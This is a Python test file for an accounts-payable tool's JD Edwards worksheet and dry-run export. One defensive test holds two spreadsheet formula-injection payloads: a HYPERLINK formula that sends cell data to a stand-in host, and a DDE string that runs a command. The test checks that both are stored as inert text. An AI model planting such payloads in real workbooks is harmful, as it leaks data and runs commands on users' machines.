"""JD Edwards readiness: the worksheet the JDE team answers (every open question of docs/JDE_E1.md, read back into
the settings), and the dry run (exactly what a batch would load, and why anything is held back)."""

from __future__ import annotations

import io
import re
from pathlib import Path

import openpyxl
import pytest

from ap_coder.core.memory import vendor_key
from ap_coder.erp import jde, jde_worksheet

from .test_jde import AN8, BC, CREDIT, ON, QC, USD, _invoice

ROOT = Path(__file__).resolve().parent.parent


def _sheet(settings=None, accounts=(), vendors=()) -> openpyxl.Workbook:
    data = jde_worksheet.build(
        settings or jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), list(accounts), list(vendors), lambda name: ""
    )
    return openpyxl.load_workbook(io.BytesIO(data))


def _answer(wb, **answers) -> bytes:
    ws = wb["Questions"]
    rows = {ws.cell(r, 1).value: r for r in range(2, ws.max_row + 1)}
    for key, value in answers.items():
        ws.cell(rows[key.replace("__", ":")], 6).value = value
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def test_the_worksheet_asks_every_open_question_of_the_jde_doc():
    """Each bullet under "Open questions for the JDE team" in docs/JDE_E1.md has a question in the worksheet."""
    doc = (ROOT / "docs" / "JDE_E1.md").read_text(encoding="utf-8")
    section = doc.split("## Open questions for the JDE team", 1)[1].split("\n## ", 1)[0]
    bullets = [b for b in re.split(r"\n\* ", section)[1:] if b.strip()]  # the text before the first bullet is not one
    assert len(bullets) == 8
    asked = " ".join(f"{q.question} {q.jde_field}" for q in jde_worksheet.QUESTIONS).lower()
    needles = {  # one word or field of each bullet that its question must cover
        "company numbers": "company", "document type": "document type", "tax areas": "aais",
        "implied decimals": "implied decimals", "account mapping": "right-justified", "batch numbering": "batch",
        "the po path": "receipts", "exchange rates": "exchange rates",
    }  # fmt: skip
    for bullet in bullets:
        key = next((k for k in needles if k in bullet.lower()), None)
        assert key, f"no worksheet question checked for: {bullet[:60]}"
        assert needles[key] in asked, bullet[:60]
    wb = _sheet(accounts=[{"code": "6100", "description": "Office supplies"}], vendors=[{"vendor_name": "Acme"}])
    assert wb.sheetnames == ["Read me", "Questions", "Tax areas", "Account mapping", "Suppliers"]
    assert [c.value or "" for c in wb["Account mapping"][2]][:3] == ["6100", "", "Office supplies"]
    assert wb["Suppliers"]["A2"].value == "Acme" and wb["Tax areas"]["A2"].value


def test_answers_are_applied_and_bad_ones_reported_never_guessed():
    wb = _sheet(vendors=[{"vendor_name": "Northwind IT Solutions Inc."}])
    wb["Tax areas"]["E2"], wb["Tax areas"]["F2"] = "ABGST", "z"  # code Z: not one AP Coder knows
    wb["Suppliers"]["C2"] = "10023"
    data = _answer(wb, company="42", document_type="pz", decimals="Decimal point ($5.50 → 5.50)", po_matched="oui",
                   currencies="cad; usd", info__p0400047="ZJDE0001", amount_mode="something else",
                   user="FAR_TOO_LONG_USER", send_due_date="maybe")  # fmt: skip
    result = jde_worksheet.read(data, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS))
    s = result.settings
    assert (s.company_code, s.document_type, s.decimals, s.po_matched, s.currencies) == (
        "00042", "PZ", jde.POINT, True, ["CAD", "USD"])  # fmt: skip
    assert s.answers == {"info:p0400047": "ZJDE0001"} and s.an8_overrides == {
        vendor_key("Northwind IT Solutions Inc."): "10023"
    }
    assert s.amount_mode == jde.AMOUNT_GROSS and s.user == "APCODER" and s.send_due_date  # kept: not understood
    problems = " ".join(result.problems)
    assert "something else" in problems and "longer than 10" in problems and "yes or no" in problems
    assert "code “Z”" in problems and s.tax_map["AB"] == jde.default_tax_map()["AB"]
    assert len(result.changes) == 6  # "cad; usd" is what AP Coder already had
    again = jde_worksheet.read(data, s)  # the same worksheet twice: nothing new
    assert again.changes == [] and jde.JdeSettings.from_json(s.to_json()).answers == s.answers


def test_the_drop_down_answer_and_a_mapping_row_round_trip():
    wb = _sheet(accounts=[{"code": "6010", "description": "Computers"}])
    acc = wb["Account mapping"]
    acc["D2"], acc["E2"], acc["F2"] = "100", "6010", "01"
    data = _answer(wb, amount_mode="Taxable / non-taxable / tax amounts (VLATXA; VLATXN; VLSTAM): the tax printed on "
                   "the invoice", line_numbering="Match header")  # fmt: skip
    s = jde_worksheet.read(data, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS)).settings
    assert s.amount_mode == jde.AMOUNT_TAX and s.line_numbering == jde.MATCH_HEADER
    assert [jde.ani(m) for m in s.gl_map] == ["100.6010.01"]


def test_the_worksheet_holds_no_formula_from_a_document():
    evil = '=HYPERLINK("http://x.example/?"&A1,"Click")'
    data = jde_worksheet.build(jde.JdeSettings(), [{"code": "6010", "description": "+cmd|' /C calc'!A0"}],
                               [{"vendor_name": evil}], lambda name: "")  # fmt: skip
    wb = openpyxl.load_workbook(io.BytesIO(data))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert wb["Suppliers"]["A2"].value == evil  # kept as text, word for word


@pytest.mark.parametrize("content", [b"not a workbook", b"PK\x03\x04 broken zip"])
def test_a_file_that_is_not_the_worksheet_is_refused(content):
    result = jde_worksheet.read(content, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS))
    assert result.changes == [] and "could not be opened" in result.problems[0]
    other = openpyxl.Workbook()
    buf = io.BytesIO()
    other.save(buf)
    assert (
        "not AP Coder's JDE worksheet"
        in jde_worksheet.read(buf.getvalue(), jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS)).problems[0]
    )


def test_the_dry_run_says_what_loads_and_why_anything_is_held_back():
    invoices = [_invoice(ON, 1), _invoice(BC, 2), _invoice(QC, 3), _invoice(CREDIT, 4), _invoice(USD, 5)]
    unknown_usd = lambda final: "" if "cascade" in (final.get("vendor_name") or "").lower() else "10023"  # noqa: E731
    report = jde.dry_run(invoices, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), unknown_usd, batch=12)
    assert [v["id"] for v in report["vouchers"]] == [1, 2, 3, 4] and [h["id"] for h in report["held"]] == [5]
    assert "AN8" in report["held"][0]["reasons"][0]
    files = jde.export_batch(invoices[:4], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), AN8, batch=12)
    rows = {name: len(data.decode().splitlines()) - 1 for name, data in files.items()}
    assert (
        report["files"][jde.HEADER_FILE] == rows[jde.HEADER_FILE]
        and report["files"][jde.DIST_FILE] == rows[jde.DIST_FILE]
    )
    text = jde.dry_run_text(report)
    assert "Will load: 4 voucher(s)" in text and "HELD BACK  AP Coder #5" in text
    assert "code C" in text and "BC-GSTPST" in text  # BC: PST in the expense lines, GST posted by E1
    bc = next(v for v in report["vouchers"] if v["id"] == 2)
    assert bc["balance"].startswith("distribution 2,916.82 = gross 3,053.12 - tax E1 posts 136.30")


def test_nothing_loads_while_a_setting_stops_every_export():
    report = jde.dry_run([_invoice(ON, 1)], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS, company="ABC"), AN8)
    assert report["vouchers"] == [] and report["held"][0]["reasons"] == ["the JD Edwards settings above"]
    assert "NOTHING CAN LOAD" in jde.dry_run_text(report)


def test_an_uncoded_line_is_held_back_in_plain_words():
    inv = _invoice(ON, 1)
    inv["final_output"]["gl_distribution"][0]["gl_code"] = "UNASSIGNED"
    (reasons,) = jde.validate([inv], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), AN8).values()
    assert any("has no GL account" in r and "review screen" in r for r in reasons)
    assert not any("too long" in r for r in reasons)


def test_the_dry_run_gross_is_the_whole_invoice_in_every_amount_mode():
    """With taxable / non-taxable / tax amounts there is no gross column: the dry run adds the three up (from the
    VLC* columns for a foreign invoice), never shows the non-taxable part as the gross."""
    settings = jde.JdeSettings(amount_mode=jde.AMOUNT_TAX, currencies=["CAD", "USD"])
    for inv in (_invoice(ON, 1), _invoice(ON, 2, currency="USD")):
        (voucher,) = jde.dry_run([inv], settings, AN8)["vouchers"]
        (item,) = voucher["pay_items"]
        assert (item["gross"], item["tax"]) == ("18,017.85", "2,072.85"), voucher["currency"]


def test_the_worksheet_answer_and_code_cells_are_text():
    """Excel turns 01 typed in a General cell into the number 1: a subsidiary or terms code would lose its zero."""
    wb = _sheet(accounts=[{"code": "6010", "description": "Computers"}], vendors=[{"vendor_name": "Northwind"}])
    code_columns = {"Questions": "EF", "Tax areas": "CDEF", "Account mapping": "ABDEFGH", "Suppliers": "BC"}
    for sheet, columns in code_columns.items():
        for col in columns:
            assert wb[sheet][f"{col}2"].number_format == "@", (sheet, col)


def test_how_the_line_numbers_load_is_asked_of_the_jde_team():
    """E1 shows EDLN with display decimals: a direct table load of VLEDLN 1 may read 0.001. Until the JDE team says,
    it is an open question in the README, the worksheet and docs/JDE_E1.md."""
    assert any("VLEDLN / VNEDLN" in item and "0.001" in item for item in jde.UNCONFIRMED)
    asked = [q for q in jde_worksheet.QUESTIONS if "EDLN" in q.jde_field and "0.001" in q.question]
    assert [q.kind for q in asked] == [jde_worksheet.INFO]
    texts = [str(c.value or "") for row in _sheet()["Questions"].iter_rows() for c in row]
    assert any("0.001" in t for t in texts)
    assert "0.001" in (ROOT / "docs" / "JDE_E1.md").read_text(encoding="utf-8").split("## Open questions", 1)[1]
